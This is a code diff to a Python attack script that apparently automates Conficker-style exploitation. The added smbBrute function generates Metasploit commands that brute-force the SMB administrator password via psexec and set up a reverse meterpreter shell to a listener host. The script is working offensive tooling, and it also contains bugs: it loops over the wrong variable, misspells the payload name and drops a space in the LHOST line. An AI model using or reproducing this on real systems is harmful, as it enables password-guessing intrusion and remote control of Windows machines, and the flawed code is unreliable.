@@ -38,19 +38,30 @@ def confickerExploit(configFile,tgtHost,lhost,lport):
 
 
 
-def smbBrute(config):
+def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
     # 爆破SMB 用户名/密码
-
+    username = 'administrator'
+    pf = open(passwdFile,'r')
+    for passwd in passwdFile:
+        passwd = passwd.strip('\n').strip('\r')
+        configFile.write('use exploit/windows/smb/psexec\n')
+        configFile.write('set SMBUser '+str(username)+'\n')
+        configFile.write('set SMBPass '+str(passwd)+'\n')
+        configFile.write('set RHOST '+ str(tgtHost)+'\n')
+        configFile.write('set payload '+ 'windows/meterpreter/revers_tcp\n')
+        configFile.write('set LPORT '+ str(lport)+'\n')
+        configFile.write('set LHOST' + lhost+'\n')
+        configFile.write('exploit -j -z\n')
 
 
 def main():
     # 设置命令行参数
     configfile = open('meta.rc', 'w')
-    parser = optparse.OptionParser("[-] usage%prog -h <RHOST[s]> -l <LHOST> [-p <LPORT> -f <Password File>]")
-    parser.add_option('-h', dst='rhost', type='string', help='specify the target address')
-    parser.add_option('-l', dst='lhost', type='string', help='specify the listen address')
-    parser.add_option('-p', dst='lport', type='string', help='specify the listen port')
-    parser.add_option('-f', dst='passwdFile', type='string', help='password file for SMB brute force attempt')
+    parser = optparse.OptionParser("[-] usage%prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -f <Password File>]")
+    parser.add_option('-H', dest='rhost', type='string', help='specify the target address')
+    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
+    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
+    parser.add_option('-f', dest='passwdFile', type='string', help='password file for SMB brute force attempt')
     (options, args) = parser.parse_args()
     if (options.rhost == None) | (options.lhost == None):
         print parser.usage
